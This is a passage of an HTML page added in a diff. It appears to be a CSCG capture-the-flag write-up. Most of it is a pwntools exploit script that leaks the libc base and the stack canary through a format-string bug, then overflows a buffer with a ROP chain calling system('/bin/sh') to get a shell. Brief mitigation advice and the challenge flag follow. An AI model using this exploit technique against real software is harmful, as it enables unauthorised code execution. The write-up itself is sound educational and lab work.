+    rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
+    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&apos;pop rdi&apos;</span><span class="token punctuation">,</span><span class="token string">&apos;ret&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b&apos;/bin/sh\x00&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    rop<span class="token punctuation">.</span>call<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">&apos;system&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">&quot;Shell chain: \n&quot;</span> <span class="token operator">+</span> white<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment">#PWN</span>
+<span class="token keyword">if</span> lo<span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;:\n&quot;</span><span class="token punctuation">,</span><span class="token string">r&quot;CSCG{THIS_IS_TEST_FLAG}&quot;</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;:\n&quot;</span><span class="token punctuation">,</span><span class="token string">r&quot;CSCG{NOW_PRACTICE_MORE}&quot;</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> buffer_overflow<span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">,</span><span class="token string">b&quot;A&quot;</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">,</span><span class="token string">b&quot;Expelliarmus\x00&quot;</span><span class="token operator">+</span>cyclic<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#we will hit the stack protector, but the padding hasn&apos;t changed anyway</span>
+
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;:\n&quot;</span><span class="token punctuation">,</span><span class="token string">b&quot;AAAA%45$p BBBB%39$p&quot;</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">&quot;AAAA&quot;</span><span class="token punctuation">)</span>
+leak <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">&quot; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+leak_libc_start_main<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&quot;Libc base address: &quot;</span> <span class="token operator">+</span> green<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">&quot;BBBB&quot;</span><span class="token punctuation">)</span>
+leak <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">&quot; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&quot;stack canary: &quot;</span> <span class="token operator">+</span> green<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+padding <span class="token operator">=</span> cyclic_find<span class="token punctuation">(</span><span class="token number">0x61616e63</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">,</span><span class="token string">b&quot;Expelliarmus\x00&quot;</span><span class="token operator">+</span><span class="token string">b&quot;B&quot;</span><span class="token operator">*</span>padding<span class="token operator">+</span>p64<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token operator">+</span>nop_libc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>nop_libc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>shell_system<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</pre><h2 class="mume-header" id="mitigation">Mitigation</h2>
+
+<ul>
+<li>use safe functions like <code>read</code> to prevent buffer overflows</li>
+<li>never use printf on user controlled data, use <code>puts</code> or <code>printf(&quot;%s&quot;,data)</code></li>
+</ul>
+<h2 class="mume-header" id="flag">Flag</h2>
+
+<p>CSCG{NOW_GET_VOLDEMORT}</p>
+
+      </div>
+      
+      
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    </body></html>
